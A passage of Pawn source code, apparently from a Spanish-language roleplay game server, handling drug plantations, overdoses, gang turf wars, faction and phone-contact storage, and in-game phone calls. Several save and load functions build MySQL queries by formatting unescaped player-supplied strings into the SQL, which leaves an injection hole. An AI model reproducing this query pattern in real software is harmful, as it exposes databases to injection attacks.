		mysql_store_result();
		if(cache_get_field_content_int(0, "Estado") != 0)
		{
			PlantaInfo[x][plSQLID] = cache_get_field_content_int(0, "SQLID");
			PlantaInfo[x][plTipo] = cache_get_field_content_int(0, "Tipo");
			PlantaInfo[x][plX] = cache_get_field_content_float(0, "X");
			PlantaInfo[x][plY] = cache_get_field_content_float(0, "Y");
			PlantaInfo[x][plZ] = cache_get_field_content_float(0, "Z");
			PlantaInfo[x][plEstado] = cache_get_field_content_int(0, "Estado");
			PlantaInfo[x][plInt] = cache_get_field_content_int(0, "Interior");
			PlantaInfo[x][plVW]  = cache_get_field_content_int(0, "VirtualWorld");
		 	cache_get_field_content(0, "Plantador", content);
		    format(PlantaInfo[x][plPlantador], 60, "%s", content);
		    
		    PlantaInfo[x][plObjeto] = CreateDynamicObject(2195, PlantaInfo[x][plX], PlantaInfo[x][plY], PlantaInfo[x][plZ] - 0.9, 0, 0, 0, PlantaInfo[x][plInt], PlantaInfo[x][plVW]);
		    
			PlantaInfo[x][plPickup] = CreateDynamic3DTextLabel("",Verde,PlantaInfo[x][plX], PlantaInfo[x][plY], PlantaInfo[x][plZ],7.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,PlantaInfo[x][plVW],PlantaInfo[x][plInt]);
			UpdatePlantacionLabel(x);

            TotalPlantaciones++;
		}
		if(ccount >= CodigoPlantacion){CodigoPlantacion = ccount+1;}
	}
	mysql_free_result();
	printf("Plantaciones cargadas: %d CodigoPlantacion: %d", TotalPlantaciones, CodigoPlantacion);
	return 1;
}

stock DarSobredosis(playerid)
{
	new drogasunidad, hora, minuto;
	drogasunidad += (PlayerInfo[playerid][pDrConsumida][0]/19); //Marihuana
	drogasunidad += (PlayerInfo[playerid][pDrConsumida][1]/30); //Cocaína
	drogasunidad += (PlayerInfo[playerid][pDrConsumida][2]/20); //Crack
	drogasunidad += (PlayerInfo[playerid][pDrConsumida][3]/40); //Heroína
	drogasunidad += (PlayerInfo[playerid][pDrConsumida][4]/25); //LSD
	if(drogasunidad >= 6)
	{
		SendClientMessage(playerid, NaranjaOscuro, "* Has sufrido una sobredosis por consumir demasiada droga en tan poco tiempo.");
		SetPlayerHealth(playerid,0.0);
		RemovePlayerColorFade(playerid);
		SetPlayerWeather(playerid, DefaultWeather);
		gettime(hora, minuto);
		SetPlayerTime(playerid, hora, minuto);
		return 1;
	}
	if(drogasunidad >= 4)
	{
		new rand = random(2);
		if(rand == 0)
		{
			SendClientMessage(playerid, NaranjaOscuro, "* Ten cuidao, espera a que se pasen los efectos antes de volver a consumir drogas o sufrirás una sobredosis.");
			return 1;
		}
		else
		{
			SendClientMessage(playerid, NaranjaOscuro, "* Has sufrido una sobredosis por consumir demasiada droga en tan poco tiempo.");
			SetPlayerHealth(playerid,0.0);
			RemovePlayerColorFade(playerid);
			SetPlayerWeather(playerid, DefaultWeather);
			gettime(hora, minuto);
			SetPlayerTime(playerid, hora, minuto);
			return 1;
		}
	}
	if(drogasunidad == 2 || drogasunidad == 3)
	{
		SendClientMessage(playerid, NaranjaOscuro, "* Ten cuidao, espera a que se pasen los efectos antes de volver a consumir drogas o sufrirás una sobredosis.");
		return 1;
	}
	return 1;
}

forward DarEfectoLSD(playerid);
public DarEfectoLSD(playerid)
{
	SetPlayerTime(playerid, 21, 0);
	new rand = random(3);
	if(rand == 0) //Efecto 1
	{
	    FlashPlayerScreen(playerid, 0xfcc1fdAA, 1, 12);
		SetPlayerWeather(playerid, 23+random(18));
	}
	else if(rand == 1) //Efecto 2
	{
 		FlashPlayerScreen(playerid, 0x1229FAAA, 1, 12);
		SetPlayerWeather(playerid, 23+random(18));
	}
	else if(rand == 2) //Efecto 3
	{
 		FlashPlayerScreen(playerid, 0x036611AA, 1, 12);
		SetPlayerWeather(playerid, 23+random(18));
	}
	return 1;
}

stock GivePlayerDrunkLevel(playerid, cantidad)
{
	SetPlayerDrunkLevel(playerid, GetPlayerDrunkLevel(playerid)+cantidad);
	return 1;
}

forward TimerPagar(playerid);
public TimerPagar(playerid)
{
    PagarTimer[playerid] = 0;
	return 1;
}

stock valorabsoluto(int) //Retorna valor absoluto
{
    if (int < 0)
        return -int;
    else
        return int;
}

stock HexToInt(string[]) // By DracoBlue
{
    if (string[0]==0) return 0;
    new i;
    new cur=1;
    new res=0;
    for (i=strlen(string);i>0;i--) {
        if (string[i-1]<58) res=res+cur*(string[i-1]-48); else res=res+cur*(string[i-1]-65+10);
        cur=cur*16;
    }
    return res;
}

forward AtacarTurf(turfid, tipo);
public AtacarTurf(turfid, tipo)
{
	if(tipo == 1) //Ataque
	{
	    if(TurfInfo[turfid][tAtacante] == 0) return 1; //Turf siendo atacado
	    new atacantes;
        for(new x = 0; x<MAX_PLAYERS; x++)
        {
            if(PlayerInfo[x][pFaccion] == TurfInfo[turfid][tAtacante] && PlayerInfo[x][pMuerto] == 0 && IsPlayerInDynamicArea(x, TurfInfo[turfid][tArea])) atacantes++;
        }
        
        new defensores;
        for(new x = 0; x<MAX_PLAYERS; x++)
        {
            if(PlayerInfo[x][pFaccion] == TurfInfo[turfid][tFaccion] && PlayerInfo[x][pMuerto] == 0 && IsPlayerInDynamicArea(x, TurfInfo[turfid][tArea])) defensores++;
        }
        
        if(atacantes < 2) //Menos de 2 atacantes en el turf
        {
            SendFaccionMessage(TurfInfo[turfid][tAtacante], Amarillo, "SMS de Nº oculto: Mierda, son demasiado fuertes. Salid de allí cagando leches.");
            SendFaccionMessage(TurfInfo[turfid][tFaccion], Amarillo, "SMS de Nº oculto: Bien hecho chavales, les hemos dado una lección a esos hijos de puta.");
            for(new x=0; x<MAX_PLAYERS; x++)
            {
                if(PlayerInfo[x][pFaccion] == TurfInfo[turfid][tFaccion]) RemovePlayerMapIcon(x, 1);
            }
			TurfInfo[turfid][tAtacante] = 0;
            ActualizarTurf(turfid);
            return 1;
        }
        if(defensores < 2) //Menos de 2 defensores en el turf
        {
            SendFaccionMessage(TurfInfo[turfid][tAtacante], Amarillo, "SMS de Nº oculto: Así aprenderán quiénes son los que mandan. Vámonos de aquí.");
			SendFaccionMessage(TurfInfo[turfid][tFaccion], Amarillo, "SMS de Nº oculto: Putos inútiles... Nos han humillado en nuestro territorio. Esto no quedará así.");
            for(new x=0; x<MAX_PLAYERS; x++)
            {
                if(PlayerInfo[x][pFaccion] == TurfInfo[turfid][tFaccion]) RemovePlayerMapIcon(x, 1);
            }
			TurfInfo[turfid][tAtacante] = 0;
            TurfInfo[turfid][tNivel] --;
            ActualizarTurf(turfid);
            return 1;
        }
        if(atacantes >= 2 && defensores >= 2) //Hay al menos 2 atacantes y 2 defensores en el turf
        {
            SendFaccionMessage(TurfInfo[turfid][tAtacante], Amarillo, "SMS de Nº oculto: Hay que seguir dándole a estos cabrones, aguantad.");
            SendFaccionMessage(TurfInfo[turfid][tFaccion], Amarillo, "SMS de Nº oculto: Seguid aguantando, hay que echarlos de aquí como sea.");
            SetTimerEx("AtacarTurf", 240000, false, "d, d", turfid, 1);
            return 1;
        }
	}
	if(tipo == 2) //Conquista
	{
	    if(TurfInfo[turfid][tAtacante] == 0) return 1; //Turf siendo atacado
	    new atacantes;
        for(new x = 0; x<MAX_PLAYERS; x++)
        {
            if(PlayerInfo[x][pFaccion] == TurfInfo[turfid][tAtacante] && PlayerInfo[x][pMuerto] == 0 && IsPlayerInDynamicArea(x, TurfInfo[turfid][tArea])) atacantes++;
        }

        new defensores;
        for(new x = 0; x<MAX_PLAYERS; x++)
        {
            if(PlayerInfo[x][pFaccion] == TurfInfo[turfid][tFaccion] && PlayerInfo[x][pMuerto] == 0 && IsPlayerInDynamicArea(x, TurfInfo[turfid][tArea])) defensores++;
        }

        if(atacantes < 2) //Menos de 2 atacantes en el turf
        {
            SendFaccionMessage(TurfInfo[turfid][tAtacante], Amarillo, "SMS de Nº oculto: Mierda, son demasiado fuertes. Salid de allí cagando leches.");
            SendFaccionMessage(TurfInfo[turfid][tFaccion], Amarillo, "SMS de Nº oculto: Bien hecho chavales, les hemos dado una lección a esos hijos de puta.");
            for(new x=0; x<MAX_PLAYERS; x++)
            {
                if(PlayerInfo[x][pFaccion] == TurfInfo[turfid][tFaccion]) RemovePlayerMapIcon(x, 1);
            }
            TurfInfo[turfid][tAtacante] = 0;
            ActualizarTurf(turfid);
            return 1;
        }
        if(defensores < 2) //Menos de 2 defensores en el turf
        {
            SendFaccionMessage(TurfInfo[turfid][tAtacante], Amarillo, "SMS de Nº oculto: Así se hace. A partir de ahora esto es nuestro.");
            SendFaccionMessage(TurfInfo[turfid][tFaccion], Amarillo, "SMS de Nº oculto: Hemos perdido el control del territorio...");
            for(new x=0; x<MAX_PLAYERS; x++)
            {
                if(PlayerInfo[x][pFaccion] == TurfInfo[turfid][tFaccion]) RemovePlayerMapIcon(x, 1);
            }
            TurfInfo[turfid][tFaccion] = TurfInfo[turfid][tAtacante];
            TurfInfo[turfid][tAtacante] = 0;
            ActualizarTurf(turfid);
            return 1;
        }
        if(atacantes >= 2 && defensores >= 2) //Hay al menos 2 atacantes y 2 defensores en el turf
        {
            SendFaccionMessage(TurfInfo[turfid][tAtacante], Amarillo, "SMS de Nº oculto: Hay que seguir dándole a estos cabrones, aguantad.");
            SendFaccionMessage(TurfInfo[turfid][tFaccion], Amarillo, "SMS de Nº oculto: Seguid aguantando, hay que echarlos de aquí como sea.");
            SetTimerEx("AtacarTurf", 240000, false, "d, d", turfid, 2);
            return 1;
        }
	}
	return 1;
}

stock ActualizarTurf(turfid)
{
    for(new i; i < MAX_PLAYERS; i++)
	{
	    if(FaccInfo[PlayerInfo[i][pFaccion]][fTipo] == 1 || FaccInfo[PlayerInfo[i][pFaccion]][fTipo] == 3) //Forma parte de LSPD o una banda/pandilla
	    {
	        if(TurfInfo[turfid][tAtacante] == 0) //No está siendo atacado ni conquistado
	        {
		        new color[14], alpha[3];
		        switch(TurfInfo[turfid][tNivel])
		        {
		            case 1: format(alpha,sizeof(alpha),"55");
		            case 2: format(alpha,sizeof(alpha),"88");
		            case 3: format(alpha,sizeof(alpha),"BB");
		            case 4: format(alpha,sizeof(alpha),"EE");
		            default: format(alpha,sizeof(alpha),"55");
		        }
		        format(color,sizeof(color),"0x%s%s",FaccInfo[TurfInfo[turfid][tFaccion]][fColor], alpha);
		        GangZoneShowForPlayer(i, TurfInfo[turfid][tTurf], HexToInt(color));
	        }
	    }
	    if(FaccInfo[PlayerInfo[i][pFaccion]][fTipo] == 3) //Forma parte solo de una banda/pandilla
	    {
	        if(TurfInfo[turfid][tAtacante] != 0) //Está siendo atacado o conquistado
			{
			    new color2[14], alpha2[3];
		        switch(TurfInfo[turfid][tNivel])
		        {
		            case 1: format(alpha2,sizeof(alpha2),"55");
		            case 2: format(alpha2,sizeof(alpha2),"88");
		            case 3: format(alpha2,sizeof(alpha2),"BB");
		            case 4: format(alpha2,sizeof(alpha2),"EE");
		            default: format(alpha2,sizeof(alpha2),"55");
		        }
		        format(color2,sizeof(color2),"0x%s%s",FaccInfo[TurfInfo[turfid][tAtacante]][fColor], alpha2);
		        GangZoneFlashForPlayer(i, TurfInfo[turfid][tTurf], HexToInt(color2));
			}
	    }
	}
	return 1;
}

stock GetPlayerTurf(playerid) //Retorna la ID del turf en la que se encuentra el jugador
{
	new turfid;
    for(new i; i <= TotalTurfs; i++)
	{
		if(IsPlayerInDynamicArea(playerid, TurfInfo[i][tArea])){turfid = i; break;}
	}
	return turfid;
}

stock MostrarTurfs(playerid) //Mostrar turfs a un jugador
{
    new Faccion = PlayerInfo[playerid][pFaccion];
    if(FaccInfo[Faccion][fTipo] == 1 || FaccInfo[Faccion][fTipo] == 3) //Forma parte de LSPD o una banda/pandilla
    {
        new color[14], alpha[3];
	    for(new x=1; x<=TotalTurfs; x++)
	    {
	        switch(TurfInfo[x][tNivel])
	        {
	            case 1: format(alpha,sizeof(alpha),"55");
	            case 2: format(alpha,sizeof(alpha),"88");
	            case 3: format(alpha,sizeof(alpha),"BB");
	            case 4: format(alpha,sizeof(alpha),"EE");
	            default: format(alpha,sizeof(alpha),"55");
	        }
	        format(color,sizeof(color),"0x%s%s",FaccInfo[TurfInfo[x][tFaccion]][fColor], alpha);
	        GangZoneShowForPlayer(playerid, TurfInfo[x][tTurf], HexToInt(color));
	    }
    }
    return 1;
}

LoadTurfs()
{
	for(new i; i < MAX_TURFS; i++)
	{
		TurfInfo[i][tTurf] = NOEXISTE;
	}

	new Query[180];
	new ccount;
	new sql[80], row[512];
	format(sql, sizeof(sql), "SELECT ID FROM turfs ORDER BY ID DESC");
	mysql_query(1, sql);
	mysql_store_result();
	mysql_fetch_row(row);
	ccount = strval(row);

	for(new x=1; x<=ccount; x++)
	{
	    mysql_format(1, Query, sizeof(Query), "SELECT * FROM `turfs` WHERE `ID` = %d", x);
		mysql_query(1, Query);
		mysql_store_result();
		if(cache_get_field_content_float(0, "MinX") != 0)
		{
			TurfInfo[x][tID] = cache_get_field_content_int(0, "ID");
		 	TurfInfo[x][tMinX] = cache_get_field_content_float(0, "MinX");
		 	TurfInfo[x][tMinY] = cache_get_field_content_float(0, "MinY");
		 	TurfInfo[x][tMaxX] = cache_get_field_content_float(0, "MaxX");
		 	TurfInfo[x][tMaxY] = cache_get_field_content_float(0, "MaxY");
			TurfInfo[x][tFaccion] = cache_get_field_content_int(0, "Faccion");
			TurfInfo[x][tNivel] = cache_get_field_content_int(0, "Nivel");
			TurfInfo[x][tDistrbuirDrogaX] = cache_get_field_content_float(0, "DistrbuirDrogaX");
		 	TurfInfo[x][tDistrbuirDrogaY] = cache_get_field_content_float(0, "DistrbuirDrogaY");
		 	TurfInfo[x][tDistrbuirDrogaZ] = cache_get_field_content_float(0, "DistrbuirDrogaZ");
		 	TurfInfo[x][tDrogaVendida][0] = cache_get_field_content_int(0, "DrogaVendida1");
		 	TurfInfo[x][tDrogaVendida][1] = cache_get_field_content_int(0, "DrogaVendida2");
		 	TurfInfo[x][tDrogaVendida][2] = cache_get_field_content_int(0, "DrogaVendida3");
		 	TurfInfo[x][tDrogaVendida][3] = cache_get_field_content_int(0, "DrogaVendida4");
		 	TurfInfo[x][tDrogaVendida][4] = cache_get_field_content_int(0, "DrogaVendida5");
		 	TurfInfo[x][tTurf] = GangZoneCreate(TurfInfo[x][tMinX], TurfInfo[x][tMinY], TurfInfo[x][tMaxX], TurfInfo[x][tMaxY]);
		 	TurfInfo[x][tArea] = CreateDynamicRectangle(TurfInfo[x][tMinX], TurfInfo[x][tMinY], TurfInfo[x][tMaxX], TurfInfo[x][tMaxY]);
		 	if(TurfInfo[x][tFaccion] == 0) TurfInfo[x][tNivel] = 1;
		 	if(TurfInfo[x][tNivel] < 1) TurfInfo[x][tNivel] = 1;
		 	if(TurfInfo[x][tNivel] > 4) TurfInfo[x][tNivel] = 4;
		 	if(TotalTurfs < x) TotalTurfs = x;
		 	mysql_free_result();
	 	}
	}
	printf("Turfs cargados: %d (MAX: %d)", TotalTurfs, MAX_TURFS);
}

SaveTurf(TurfID)
{
	new Query[300];
	format(Query, sizeof(Query), "UPDATE turfs SET Faccion=%d,Nivel=%d WHERE ID=%d",
	TurfInfo[TurfID][tFaccion],
	TurfInfo[TurfID][tNivel],
	TurfInfo[TurfID][tID]);
	mysql_query(1, Query);
	
	for(new x = 0; x<5; x++)
	{
		format(Query, sizeof(Query), "UPDATE turfs SET DrogaVendida%d=%d WHERE ID=%d",
		x+1, TurfInfo[TurfID][tDrogaVendida][x],
		TurfInfo[TurfID][tID]);
		mysql_query(1, Query);
	}
	return 1;
}

LoadFaccs()
{
	new Query[180], content[60];
	new ccount;
	new sql[80], row[512];
	format(sql, sizeof(sql), "SELECT ID FROM facciones ORDER BY ID DESC");
	mysql_query(1, sql);
	mysql_store_result();
	mysql_fetch_row(row);
	ccount = strval(row);

	for(new x=0; x<=ccount; x++)
	{
	    mysql_format(1, Query, sizeof(Query), "SELECT * FROM `facciones` WHERE `ID` = %d", x);
		mysql_query(1, Query);
		mysql_store_result();
		FaccInfo[x][fID] = cache_get_field_content_int(0, "ID");
		
	 	cache_get_field_content(0, "Nombre", content);
		format(FaccInfo[x][fNombre], 60, "%s", content);
		
		cache_get_field_content(0, "Rango1", content);
		format(FaccInfo[x][fRango1], 32, "%s", content);
		cache_get_field_content(0, "Rango2", content);
		format(FaccInfo[x][fRango2], 32, "%s", content);
		cache_get_field_content(0, "Rango3", content);
		format(FaccInfo[x][fRango3], 32, "%s", content);
		cache_get_field_content(0, "Rango4", content);
		format(FaccInfo[x][fRango4], 32, "%s", content);
		cache_get_field_content(0, "Rango5", content);
		format(FaccInfo[x][fRango5], 32, "%s", content);
		cache_get_field_content(0, "Rango6", content);
		format(FaccInfo[x][fRango6], 32, "%s", content);
		cache_get_field_content(0, "Rango7", content);
		format(FaccInfo[x][fRango7], 32, "%s", content);
		cache_get_field_content(0, "Rango8", content);
		format(FaccInfo[x][fRango8], 32, "%s", content);
		
		cache_get_field_content(0, "Lider", content);
		format(FaccInfo[x][fLider], 32, "%s", content);
		
		FaccInfo[x][fTipo] = cache_get_field_content_int(0, "Tipo");
		
		cache_get_field_content(0, "Color", content);
		format(FaccInfo[x][fColor], 9, "%s", content);
		
		FaccInfo[x][fPuntosExpansion] = cache_get_field_content_int(0, "PuntosExpansion");
		
		FaccInfo[x][fTiempoArmas] = cache_get_field_content_int(0, "TiempoArmas");
		
		FaccInfo[x][fTiempoDrogas] = cache_get_field_content_int(0, "TiempoDrogas");
		
	 	if(TotalFaccs < x) TotalFaccs = x;
	 	mysql_free_result();
	}
	printf("Facciones cargadas: %d (MAX: %d)", TotalFaccs, MAX_FACCS);
}

SaveFacc(FaccID)
{
	new Query[300];
	format(Query, sizeof(Query), "UPDATE facciones SET Rango1='%s', Rango2='%s', Rango3='%s', Rango4='%s', Rango5='%s', Rango6='%s', Rango7='%s', Rango8='%s' WHERE ID = %d",
	FaccInfo[FaccID][fRango1],
	FaccInfo[FaccID][fRango2],
	FaccInfo[FaccID][fRango3],
	FaccInfo[FaccID][fRango4],
	FaccInfo[FaccID][fRango5],
	FaccInfo[FaccID][fRango6],
	FaccInfo[FaccID][fRango7],
	FaccInfo[FaccID][fRango8],
	FaccInfo[FaccID][fID]);
	mysql_query(1, Query);
	
	format(Query, sizeof(Query), "UPDATE facciones SET Nombre='%s', Lider='%s', Tipo=%d, Color='%s', PuntosExpansion=%d, TiempoArmas=%d, TiempoDrogas=%d WHERE ID = %d",
	FaccInfo[FaccID][fNombre],
	FaccInfo[FaccID][fLider],
	FaccInfo[FaccID][fTipo],
	FaccInfo[FaccID][fColor],
	FaccInfo[FaccID][fPuntosExpansion],
	FaccInfo[FaccID][fTiempoArmas],
	FaccInfo[FaccID][fTiempoDrogas],
	FaccInfo[FaccID][fID]);
	mysql_query(1, Query);
	return 1;
}

stock CargarAgenda(playerid)
{
    new string[128];
    format(string, sizeof(string), "SELECT Nombre FROM agendas WHERE Nombre = '%s'", PlayerInfo[playerid][pNombre]);
    mysql_query(1, string);
	mysql_store_result();
	new existe;
	existe = mysql_num_rows();
	mysql_free_result();
	if(existe != 0)
	{
	    new Query[180], NombreUsuario[MAX_PLAYER_NAME], content[60];
		GetPlayerName(playerid, NombreUsuario, sizeof(NombreUsuario));
		mysql_format(1, Query, sizeof(Query), "SELECT * FROM `agendas` WHERE `Nombre` = '%s'", NombreUsuario);
		mysql_query(1, Query);
		mysql_store_result();
		
        AgendaNumero[playerid][0] = cache_get_field_content_int(0, "AgendaNumero0");
        cache_get_field_content(0, "AgendaContacto0", content);
		format(AgendaContacto[playerid][0], sizeof(content), "%s", content);
		AgendaNumero[playerid][1] = cache_get_field_content_int(0, "AgendaNumero1");
        cache_get_field_content(0, "AgendaContacto1", content);
		format(AgendaContacto[playerid][1], sizeof(content), "%s", content);
		AgendaNumero[playerid][2] = cache_get_field_content_int(0, "AgendaNumero2");
        cache_get_field_content(0, "AgendaContacto2", content);
		format(AgendaContacto[playerid][2], sizeof(content), "%s", content);
        AgendaNumero[playerid][3] = cache_get_field_content_int(0, "AgendaNumero3");
        cache_get_field_content(0, "AgendaContacto3", content);
		format(AgendaContacto[playerid][3], sizeof(content), "%s", content);
		AgendaNumero[playerid][4] = cache_get_field_content_int(0, "AgendaNumero4");
        cache_get_field_content(0, "AgendaContacto4", content);
		format(AgendaContacto[playerid][4], sizeof(content), "%s", content);
		AgendaNumero[playerid][5] = cache_get_field_content_int(0, "AgendaNumero5");
        cache_get_field_content(0, "AgendaContacto5", content);
		format(AgendaContacto[playerid][5], sizeof(content), "%s", content);
		AgendaNumero[playerid][6] = cache_get_field_content_int(0, "AgendaNumero6");
        cache_get_field_content(0, "AgendaContacto6", content);
		format(AgendaContacto[playerid][6], sizeof(content), "%s", content);
		AgendaNumero[playerid][7] = cache_get_field_content_int(0, "AgendaNumero7");
        cache_get_field_content(0, "AgendaContacto7", content);
		format(AgendaContacto[playerid][7], sizeof(content), "%s", content);
		AgendaNumero[playerid][8] = cache_get_field_content_int(0, "AgendaNumero8");
        cache_get_field_content(0, "AgendaContacto8", content);
		format(AgendaContacto[playerid][8], sizeof(content), "%s", content);
		AgendaNumero[playerid][9] = cache_get_field_content_int(0, "AgendaNumero9");
        cache_get_field_content(0, "AgendaContacto9", content);
		format(AgendaContacto[playerid][9], sizeof(content), "%s", content);
		AgendaNumero[playerid][10] = cache_get_field_content_int(0, "AgendaNumero10");
        cache_get_field_content(0, "AgendaContacto10", content);
		format(AgendaContacto[playerid][10], sizeof(content), "%s", content);
		AgendaNumero[playerid][11] = cache_get_field_content_int(0, "AgendaNumero11");
        cache_get_field_content(0, "AgendaContacto11", content);
		format(AgendaContacto[playerid][11], sizeof(content), "%s", content);
		AgendaNumero[playerid][12] = cache_get_field_content_int(0, "AgendaNumero12");
        cache_get_field_content(0, "AgendaContacto12", content);
		format(AgendaContacto[playerid][12], sizeof(content), "%s", content);
		AgendaNumero[playerid][13] = cache_get_field_content_int(0, "AgendaNumero13");
        cache_get_field_content(0, "AgendaContacto13", content);
		format(AgendaContacto[playerid][13], sizeof(content), "%s", content);
		AgendaNumero[playerid][14] = cache_get_field_content_int(0, "AgendaNumero14");
        cache_get_field_content(0, "AgendaContacto14", content);
		format(AgendaContacto[playerid][14], sizeof(content), "%s", content);
		AgendaNumero[playerid][15] = cache_get_field_content_int(0, "AgendaNumero15");
        cache_get_field_content(0, "AgendaContacto15", content);
		format(AgendaContacto[playerid][15], sizeof(content), "%s", content);
	    mysql_free_result();
	    return 1;
	}
	return 1;
}

stock GuardarAgenda(playerid)
{
    new string[128];
    format(string, sizeof(string), "SELECT Nombre FROM agendas WHERE Nombre = '%s'", PlayerInfo[playerid][pNombre]);
    mysql_query(1, string);
	mysql_store_result();
	new existe;
	existe = mysql_num_rows();
	mysql_free_result();
	if(existe != 0)
	{
	    new Query[180];

	    for(new x=0; x<16; x++)
	    {
            mysql_format(1, Query, sizeof(Query), "UPDATE agendas SET AgendaNumero%d = %d, AgendaContacto%d = '%s' WHERE Nombre = '%s'",
			x, AgendaNumero[playerid][x], x, AgendaContacto[playerid][x],
			PlayerInfo[playerid][pNombre]);
			mysql_query(1, Query);
	    }
	}
	return 1;
}

stock ActualizarHambre(playerid)
{
    if(PlayerInfo[playerid][pHambre] < MIN_HAMBRE){PlayerInfo[playerid][pHambre] = MIN_HAMBRE;}
    SetPlayerProgressBarValue(playerid, hambrebar[playerid], PlayerInfo[playerid][pHambre]);
	UpdatePlayerProgressBar(playerid, hambrebar[playerid]);
	SetPlayerProgressBarColor(playerid, hambrebar[playerid], Naranja);
	if(PlayerInfo[playerid][pHambre] == MIN_HAMBRE*2){SendClientMessage(playerid, NaranjaOscuro, "Empiezas a tener mucha hambre. Deberías comer algo.");}
	if(PlayerInfo[playerid][pHambre] <= MIN_HAMBRE*2)
	{
	    new mareo = (5000*MIN_HAMBRE)/PlayerInfo[playerid][pHambre];
        SetPlayerDrunkLevel(playerid, mareo);
        SetPlayerProgressBarColor(playerid, hambrebar[playerid], RojoIntenso);
	}
	if(PlayerInfo[playerid][pHambre] <= MIN_HAMBRE)
	{
	    SetPlayerProgressBarColor(playerid, hambrebar[playerid], RojoOscuro);
	}
	return 1;
}

stock ActualizarSed(playerid)
{
    if(PlayerInfo[playerid][pSed] < MIN_SED){PlayerInfo[playerid][pSed] = MIN_SED;}
    SetPlayerProgressBarValue(playerid, sedbar[playerid], PlayerInfo[playerid][pSed]);
	UpdatePlayerProgressBar(playerid, sedbar[playerid]);
	SetPlayerProgressBarColor(playerid, sedbar[playerid], AguamarinaOscuro);
	if(PlayerInfo[playerid][pSed] == MIN_SED*2){SendClientMessage(playerid, NaranjaOscuro, "Empiezas a tener mucha sed. Deberías beber algo.");}
	if(PlayerInfo[playerid][pSed] <= MIN_SED*2)
	{
	    new mareo = (5000*MIN_SED)/PlayerInfo[playerid][pSed];
        SetPlayerDrunkLevel(playerid, mareo);
        SetPlayerProgressBarColor(playerid, sedbar[playerid], RojoIntenso);
	}
	if(PlayerInfo[playerid][pSed] <= MIN_SED)
	{
	    SetPlayerProgressBarColor(playerid, sedbar[playerid], RojoOscuro);
	}
	return 1;
}

forward LlamadaCoste(playerid);
public LlamadaCoste(playerid)
{
    CosteTotalLlamada[playerid] += 1;
	return 1;
}

stock LlamarTelefono(playerid, numero)
{
    if(numero == PlayerInfo[playerid][pTelefono]){SendClientMessage(playerid, Rojo, "* No te puedes llamar a tí mismo."); return 1;}

	new string[128];
	if(numero == 444) //Auncio
    {
        if(PlayerInfo[playerid][pNivel] < 2){SendClientMessage(playerid, Rojo, "* Necesitas ser como mínimo nivel 2.");return 1;}
        if(anunciotiempo > 0)
        {
            format(string, sizeof(string), "* Debes esperar %d segundos para enviar otro anuncio.", anunciotiempo);
			SendClientMessage(playerid, Rojo, string);
			return 1;
        }
        new hayadmins;
        for(new x=0; x<MAX_PLAYERS; x++)
        {
            if(PlayerInfo[x][pAdmin] > 0){hayadmins = 1; break;}
        }
        if(hayadmins == 0){SendClientMessage(playerid, Rojo, "* No se pueden enviar anuncios en este momento."); return 1;}
        SendClientMessage(playerid, Amarillo, "LSRTV: Buenos días, díganos que anuncio quiere publicar.");
        EnLlamada[playerid] = 444;
        return 1;
    }
    
    if(numero == 555) //Llama a pizzero
    {
        /*if(PlayerInfo[playerid][pTrabajo] == 1 && Trabajando[playerid] > 0){SendClientMessage(playerid, Rojo, "* No pedir una pizza siendo pizzero y estando trabajando."); return 1;}
        SendClientMessage(playerid, Amarillo, "Weel Stacked Pizza Co.: Gracias por llamar a la mejor pizzería de Los Santos.");
        new pizzero;
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(PlayerInfo[i][pTrabajo] == 1 && Trabajando[i] > 0)
			{
			    format(string, sizeof(string), "Weel Stacked Pizza Co.: Un cliente solicita una pizza. '/Entregapizza' para aceptar el pedido.", GetPlayerNameRP(playerid));
			    SendClientMessage(i, Amarillo, string);
				SendClientMessage(playerid, Amarillo, "Weel Stacked Pizza Co.: Espere mientras un pizzero acepta entregar el pedido.");
				SolicitaPizza[playerid] = 1;
				pizzero++;
			}
		}
		if(pizzero < 1){SendClientMessage(playerid, Amarillo, "Weel Stacked Pizza Co.: En estos momentos no hay pizzeros disponibles. Llame en otro momento.");}
        return 1;*/
        SendClientMessage(playerid, Rojo, "* Función inhabilitada. En breves se realizará."); return 1;
    }

    if(numero == 666) //Easter egg
    {
        SendClientMessage(playerid, RojoIntenso, "Demonio malvado: En estos momentos la agencia del infierno está saturada.");
        SendClientMessage(playerid, RojoIntenso, "Demonio malvado: Trate de vendernos su alma más tarde.");
		return 1;
    }

    if(numero == 777) //Taxis
    {
        if(PlayerInfo[playerid][pTrabajo] == 6 && Trabajando[playerid] > 0){SendClientMessage(playerid, Rojo, "* No puedes llamar a un taxi siendo taxista y estando trabajando."); return 1;}
        SendClientMessage(playerid, Amarillo, "Agencia de transporte: Gracias por elerginos como su medio de transporte.");
        new taxista;
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(PlayerInfo[i][pTrabajo] == 6 && Trabajando[i] > 0)
			{
			    format(string, sizeof(string), "Agencia de transporte: Un cliente solicita transporte. '/LlevarTaxi' para aceptar el pedido.", GetPlayerNameRP(playerid));
			    SendClientMessage(i, Amarillo, string);
				SendClientMessage(playerid, Amarillo, "Agencia de transporte: Hemos llamado a nuestros taxistas. Espere un momento, no se mueva de allí.");
				SolicitaTaxi[playerid] = 1;
				taxista++;
			}
		}
		if(taxista < 1){SendClientMessage(playerid, Amarillo, "Agencia de transporte: En estos momentos no hay taxistas disponibles. Llame en otro momento.");}
        return 1;
    }

    if(numero == 911) //Llama a LSPD
    {
        if(PlayerInfo[playerid][pFaccion] == 1 && PlayerInfo[playerid][pServicioPD] > 0){SendClientMessage(playerid, Rojo, "* No puedes llamar a la policía siendo policía y estando de servicio."); return 1;}
        SendClientMessage(playerid, AzulClaro, "EMERGENCIAS: Espere mientras le pasamos al departamento policial...");
		EnLlamada[playerid] = 911;
		new Cops;
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(PlayerInfo[i][pFaccion] == 1 && PlayerInfo[i][pServicioPD] > 0)
			{
				SendClientMessage(i, AzulClaro, "EMERGENCIAS: Una llamada esta siendo transferida al departamento de policía. ((/contestar para coger el teléfono))");
				Cops++;
			}
		}
		if(Cops < 1){SendClientMessage(playerid, AzulClaro, "EMERGENCIAS: En estos momentos nuestras líneas están saturadas ((no hay policías de servicio))."); EnLlamada[playerid] = 0;}
		return 1;
    }

    new tlfencontrado;
    for(new x=0; x<MAX_PLAYERS; x++)
    {
        if(IsPlayerConnected(x) && x != INVALID_PLAYER_ID)
        {
            if(PlayerInfo[x][pTelefono] == numero && PlayerTieneObjeto(x, 68))
            {
